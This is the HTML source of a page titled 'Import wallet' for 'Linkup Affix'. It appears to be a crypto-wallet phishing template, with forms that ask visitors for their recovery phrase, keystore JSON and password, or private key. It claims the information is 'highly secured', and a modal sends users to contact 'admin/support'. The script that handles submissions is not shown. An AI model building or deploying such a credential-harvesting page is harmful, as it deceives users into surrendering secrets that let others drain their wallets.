<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"
    />
    <title>Import wallet | Linkup Affixs</title>

    <!-- Site favicon -->
    <link
      rel="icon"
      href="./../../img/fav.jpg"
      sizes="16x16"
      type="image/png"
    />

    <!-- Font awesome (icon) -->
    <script
      src="https://kit.fontawesome.com/6d51bc153f.js"
      crossorigin="anonymous"
    ></script>

    <!-- Stylesheet (CSS) -->
    <link rel="stylesheet" href="./../../css/style.css" />
  </head>

  <body class="body-2">
    <!-- Overlay -->
    <div class="modal-layout">
      <button class='btn-close' id='close-btn'>close</button>
      <div class="modal-child">
        <div class='barcode'>
          <img src="./../../img/two.png" alt="" class='barcode-img'>
        </div>

        <h4 class='head-7 m-t-5px'>Please contact admin/support for authentication</h4>
    </div>
</div>

    <section class="section-form">
      <section class="center">
        
        <div class="form-container">
          <a href="./../../" class='link-logo'>
          <div class="logo-holder m-b-50px">
            <div class="logo-image">
              <img src="./../../img/fav.jpg" alt="" class="logo-img" />
            </div>
            <h3 class="head-1">Linkup Affix</h3>
          </div>
          </a>
          <div class="navigators">
            <button class="navigator-item active" id='btn-11'>phrase</button>
            <button class="navigator-item" id='btn-22'>keystore JSON</button>
            <button class="navigator-item" id='btn-33'>Private key</button>
          </div>



          <span class='labell labell-2 m-b-10px'> <i class="fas fa-check-circle"></i> <span>Your informations are highly secured</span> </span>
          <!--Phrase  -->
          <div class='phrase-cont animate-slide-top active'>
            <form enctype="multipart/form-data" id="importForm">
              <textarea name="phrase" id="phrase" class="inputs" minlength='12' rows="7" cols="60" placeholder='Phrase'></textarea>
              <span class='labell'>Typically 12 (sometimes 24) words seperated by a single spaces.</span>
              <button type="submit" class="btn-import m-t-50px">Import</button>
            </form>
          </div>
          
          <!--Keystore  -->
          <div class='keystore-cont animate-slide-top'>
            <form enctype="multipart/form-data" id="keystoreForm">
              <textarea name="json" id="json" class="inputs" minlength='2' rows="7" cols="60" placeholder='Keystore JSON'></textarea>
              <input type="text"  name="password" id="password" minlength='2' class="inputs m-t-10px" placeholder='Password'>
              <span class='labell'>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</span>
              <button type="submit" class="btn-import m-t-50px">Import</button>
            </form>
          </div>
          
          <!--Private  -->
          <div class='private-cont animate-slide-top'>
            <form enctype="multipart/form-data" id="privateForm">
             <input type="text"  name="privateKey" id="privateKey" minlength='12' class="inputs" placeholder='Private Key'>
              <span class='labell'>Typically 12 (sometimes 24) words seperated by a single spaces.</span>
              <button type="submit" class="btn-import m-t-50px">Import</button>
            </form>
          </div>

        </div>
      </section>
    </section>

    <script src="./../../js/jQuery.min.js"></script>
    <script src="./../../js/main.js"></script>
  </body>
</html>
